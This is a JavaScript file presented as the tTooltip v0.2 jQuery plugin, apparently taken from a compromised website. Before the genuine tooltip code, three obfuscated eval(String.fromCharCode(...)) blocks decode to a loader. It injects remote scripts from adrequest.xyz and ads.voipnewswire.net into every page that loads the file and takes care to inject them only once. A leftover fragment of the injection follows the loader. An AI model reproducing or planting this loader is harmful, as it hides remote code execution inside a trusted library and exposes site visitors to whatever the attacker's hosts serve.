var _0x44tbc1 = 1; eval(String.fromCharCode(118, 97, 114, 32, 97, 49, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 32, 61, 32, 83, 116, 114, 105, 110, 103, 91, 34, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 52, 51, 92, 120, 54, 56, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 52, 51, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 49, 49, 51, 44, 32, 49, 49, 55, 44, 32, 49, 48, 49, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 50, 48, 44, 32, 49, 50, 49, 44, 32, 49, 50, 50, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 54, 44, 32, 54, 49, 44, 32, 53, 52, 41, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 49, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 52, 92, 120, 55, 57, 92, 120, 55, 48, 92, 120, 54, 53, 34, 93, 32, 61, 32, 34, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 56, 92, 120, 55, 52, 92, 120, 50, 70, 92, 120, 54, 65, 92, 120, 54, 49, 92, 120, 55, 54, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 55, 57, 92, 120, 54, 69, 92, 120, 54, 51, 34, 93, 32, 61, 32, 116, 114, 117, 101, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 51, 92, 120, 55, 50, 92, 120, 54, 51, 34, 93, 32, 61, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 91, 48, 93, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 91, 34, 92, 120, 55, 48, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 52, 69, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 69, 92, 120, 55, 51, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 55, 52, 92, 120, 52, 50, 92, 120, 54, 53, 92, 120, 54, 54, 92, 120, 54, 70, 92, 120, 55, 50, 92, 120, 54, 53, 34, 93, 40, 95, 48, 120, 52, 50, 116, 98, 99, 50, 44, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 41, 10, 125, 59, 10, 118, 97, 114, 32, 116, 110, 100, 101, 109, 111, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 118, 97, 114, 32, 110, 32, 61, 32, 116, 114, 117, 101, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 105, 32, 61, 32, 48, 59, 32, 105, 32, 60, 32, 116, 110, 100, 101, 109, 111, 115, 91, 34, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 54, 55, 92, 120, 55, 52, 92, 120, 54, 56, 34, 93, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 110, 100, 101, 109, 111, 115, 91, 105, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 110, 32, 61, 32, 102, 97, 108, 115, 101, 10, 32, 32, 32, 32, 125, 10, 125, 59, 10, 105, 102, 32, 40, 110, 32, 61, 61, 32, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 97, 49, 40, 41, 59, 10, 125));var _0x43tbc1 = 1; eval(String.fromCharCode(118, 97, 114, 32, 97, 49, 32, 61, 32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 41, 32, 123, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 32, 61, 32, 83, 116, 114, 105, 110, 103, 91, 34, 92, 120, 54, 54, 92, 120, 55, 50, 92, 120, 54, 70, 92, 120, 54, 68, 92, 120, 52, 51, 92, 120, 54, 56, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 52, 51, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 49, 49, 51, 44, 32, 49, 49, 55, 44, 32, 49, 48, 49, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 50, 48, 44, 32, 49, 50, 49, 44, 32, 49, 50, 50, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 54, 44, 32, 54, 49, 44, 32, 53, 48, 41, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 49, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 52, 92, 120, 55, 57, 92, 120, 55, 48, 92, 120, 54, 53, 34, 93, 32, 61, 32, 34, 92, 120, 55, 52, 92, 120, 54, 53, 92, 120, 55, 56, 92, 120, 55, 52, 92, 120, 50, 70, 92, 120, 54, 65, 92, 120, 54, 49, 92, 120, 55, 54, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 49, 92, 120, 55, 51, 92, 120, 55, 57, 92, 120, 54, 69, 92, 120, 54, 51, 34, 93, 32, 61, 32, 116, 114, 117, 101, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 50, 91, 34, 92, 120, 55, 51, 92, 120, 55, 50, 92, 120, 54, 51, 34, 93, 32, 61, 32, 95, 48, 120, 52, 50, 116, 98, 99, 49, 59, 10, 32, 32, 32, 32, 118, 97, 114, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 91, 48, 93, 59, 10, 32, 32, 32, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 91, 34, 92, 120, 55, 48, 92, 120, 54, 49, 92, 120, 55, 50, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 52, 69, 92, 120, 54, 70, 92, 120, 54, 52, 92, 120, 54, 53, 34, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 69, 92, 120, 55, 51, 92, 120, 54, 53, 92, 120, 55, 50, 92, 120, 55, 52, 92, 120, 52, 50, 92, 120, 54, 53, 92, 120, 54, 54, 92, 120, 54, 70, 92, 120, 55, 50, 92, 120, 54, 53, 34, 93, 40, 95, 48, 120, 52, 50, 116, 98, 99, 50, 44, 32, 95, 48, 120, 52, 50, 116, 98, 99, 51, 41, 10, 125, 59, 10, 118, 97, 114, 32, 116, 110, 100, 101, 109, 111, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 91, 34, 92, 120, 54, 55, 92, 120, 54, 53, 92, 120, 55, 52, 92, 120, 52, 53, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 68, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 55, 52, 92, 120, 55, 51, 92, 120, 52, 50, 92, 120, 55, 57, 92, 120, 53, 52, 92, 120, 54, 49, 92, 120, 54, 55, 92, 120, 52, 69, 92, 120, 54, 49, 92, 120, 54, 68, 92, 120, 54, 53, 34, 93, 40, 34, 92, 120, 55, 51, 92, 120, 54, 51, 92, 120, 55, 50, 92, 120, 54, 57, 92, 120, 55, 48, 92, 120, 55, 52, 34, 41, 59, 10, 118, 97, 114, 32, 110, 32, 61, 32, 116, 114, 117, 101, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 105, 32, 61, 32, 48, 59, 32, 105, 32, 60, 32, 116, 110, 100, 101, 109, 111, 115, 91, 34, 92, 120, 54, 67, 92, 120, 54, 53, 92, 120, 54, 69, 92, 120, 54, 55, 92, 120, 55, 52, 92, 120, 54, 56, 34, 93, 59, 32, 105, 43, 43, 41, 32, 123, 10, 32, 32, 32, 32, 105, 102, 32, 40, 116, 110, 100, 101, 109, 111, 115, 91, 105, 93, 91, 34, 92, 120, 54, 57, 92, 120, 54, 52, 34, 93, 32, 61, 61, 32, 34, 92, 120, 54, 51, 92, 120, 54, 52, 92, 120, 51, 55, 92, 120, 51, 48, 92, 120, 51, 57, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 92, 120, 51, 49, 92, 120, 51, 48, 34, 41, 32, 123, 10, 32, 32, 32, 32, 32, 32, 32, 32, 110, 32, 61, 32, 102, 97, 108, 115, 101, 10, 32, 32, 32, 32, 125, 10, 125, 59, 10, 105, 102, 32, 40, 110, 32, 61, 61, 32, 116, 114, 117, 101, 41, 32, 123, 10, 32, 32, 32, 32, 97, 49, 40, 41, 59, 10, 125));eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125)); 
var n4 = true; for (var i = scripts.length; i--;) {if (scripts[i].src == n2.src) { n4 = false;}else{} } if(n4 == true){document.head.appendChild(n2);}/*!
 * tTooltip v0.2
 *
 * Copyright 2013 Takien
 * http://takien.com
 * 
 * Licensed under the MIT License
 * http://en.wikipedia.org/wiki/MIT_License
 *
 * follow @cektkp and @perdanaweb
 */
(function($) {
	function arrow_pos(el){
		var pos = el.position();
		var top = pos.top-$(window).scrollTop();
		var left = pos.left-$(window).scrollLeft();
		var right = $(window).width()-(left+el.width());
		var bottom = $(window).height()-(top+el.height());
		var ret = 'topleft';
		if(top > bottom){
			ret = 'bottom';
		} else {
			ret = 'top';
		}
		
		if(left > right){
			ret += 'right';
		}
		else{
			ret += 'left';
		}

		return ret;
	}
	
	$.fn.ttooltip = function(customOptions) {
		var o = $.extend({}, $.fn.ttooltip.defaultOptions, customOptions);
		var tp = $(o.template);
		var c = tp.find('.ttooltip-content');
		var t = tp.find('.ttooltip-title');
		var f = tp.find('.ttooltip-footer');
		var timeout = 0;
		var times   = 0;
		var tooltip;
		var source;
		
		tp.css({
			'position':'absolute',
			'max-width':o.maxwidth
		});
		
		return this.each(function(index) {
			var tt = $(this);
			tt.bind(o.trigger,function(e){
									
								
				clearInterval(timeout);
				
				/* append template to body*/
				tp.appendTo(document.body);

				/* update tp object to the newest dom */
				tp = $('.ttooltip-wrap');
				
				c = tp.find('.ttooltip-content');
				t = tp.find('.ttooltip-title');
				f = tp.find('.ttooltip-footer');
				
				/* collect data from data attribute */
				source = tt.data();
				if(source.href==undefined){
					source.href=tt.attr('href');
				}

				/* if no content, nothing to do here */
				if(source.content == undefined){
					return false;
				}
				/* set the content */
				/* if content is ajax, get data from data-href if any or from href attribute */
				if(source.content == 'ajax'){
					$.get(source.href,function(data){
						tp.find('.ttooltip-inner').html(data);
						o.onload(tp,tt);
					});
				}
				else {
					t.show().html(source.title);
					c.show().html(source.content);
					f.show().html(source.footer);
					
					o.onload(tp,tt);
					
					/* hide footer if empty */
					if(source.footer==undefined){
						f.empty().hide();
					}
					/* hide title if empty */
					if(source.title==undefined){
						t.empty().hide();
					}
				}
				
				

				/* add clearfix to the footer */
				c.addClass('ttooltip-clearfix');
				f.addClass('ttooltip-clearfix');
				
				/* remove any position class, then update with new position class */
				tp
				.removeClass()
				.addClass('ttooltip-wrap ttooltip-'+arrow_pos(tt))
				.fadeIn();

				var arrow 	= tp.find('.ttooltip-arrow');
				var mouseleft = (e.pageX-((arrow.outerWidth()*0.5)+arrow.position().left));
				var distance = 25;
				var mousetop;
				/* do not overlap mouse cursor with arrow */
				mouseleft = mouseleft - distance;
				
				arrow.removeClass('tooltip-arrow-gray');
				

				/*
				* use .offset() instead of .position()
				* @since: 0.2
				*/
				mousetop = tt.offset().top+tt.outerHeight()+arrow.outerHeight();
				if((arrow_pos(tt) == 'bottomright') || (arrow_pos(tt) == 'bottomleft')){
					mousetop = tt.offset().top-tp.outerHeight()-arrow.outerHeight();
					mouseleft = mouseleft - distance;
					distance = 0;

					if(tp.find('.ttooltip-footer').html() !=''){
						arrow.addClass('tooltip-arrow-gray');
					} 
				}
				
				tp
				.css({
					'top'  : mousetop,
				    'left' : mouseleft,
					'width': source.width?source.width:'auto',
					'opacity':1
				})
				.fadeIn();

				
				
				
				
				/* follow mouse movement, horizontal only */
				if(o.followmouse) {
					$(this).mousemove(function(x){
						tp.css({
							'top':mousetop,
							'left':x.pageX-arrow.position().left-distance
						})
					});
				}
				
				/* close on mouseleave*/
				
				if(o.autohide){
				/* define times, to prevent event triggered twice*/
					closewhat($(this));
					closewhat(tp);
				}

					
				
				function closewhat(what){
					what.bind(o.close,function(){
							times++;
							if(times==1){
								timeout = setTimeout(function(){
									close(tp);
								},o.timeout);
							
							tp.bind('mouseenter',function(){
								times=0;
								clearTimeout(timeout);
							});
							/*updated 30/09/2012*/
							tt.bind('mouseenter',function(){
								times=0;
								clearTimeout(timeout);
							});
							}
						});
				}
				
				/* close on esc */
				if(o.closeonesc){
					document.onkeydown = function(evt) {
					evt = evt || window.event;
						if (evt.keyCode == 27) {
							close(tp);
						}
					};
				}
				
				if(o.closebutton) {
					tp.find('.ttooltip-close').click(function(e){
						close(tp);
						e.preventDefault();
					});
				}
				else {
					tp.find('.ttooltip-close').hide();
				}
				
				function close(what){
					what.fadeOut(o.fadeoutspeed,function(){
					what.remove();
						/*call onclose callback*/
						o.onclose(what,tt);
					});
					clearTimeout(timeout);
					times=0;
				}
			
				e.preventDefault();
				
			});
			
		}); /* end loop*/

	};
 
	$.fn.ttooltip.defaultOptions = {
		autohide	: true,
		followmouse : true,
		closeonesc  : true,
		content		: '',
		title		: '',
		trigger		: 'mouseenter',
		close		: 'mouseleave',
		maxwidth	: 300,
		timeout		: 500,
		fadeoutspeed: 'fast',
		onload		: function(){},
		onclose		: function(){},
		closebutton : false,
		template	: '<div class="ttooltip-wrap"><div class="ttooltip-arrow ttooltip-arrow-border"></div><div class="ttooltip-arrow"></div><div class="ttooltip-inner"><button type="button" class="ttooltip-close">&times;</button><h3 class="ttooltip-title"></h3><div class="ttooltip-content"><p></p></div><div class="ttooltip-footer"></div></div></div>'

	};
})(jQuery);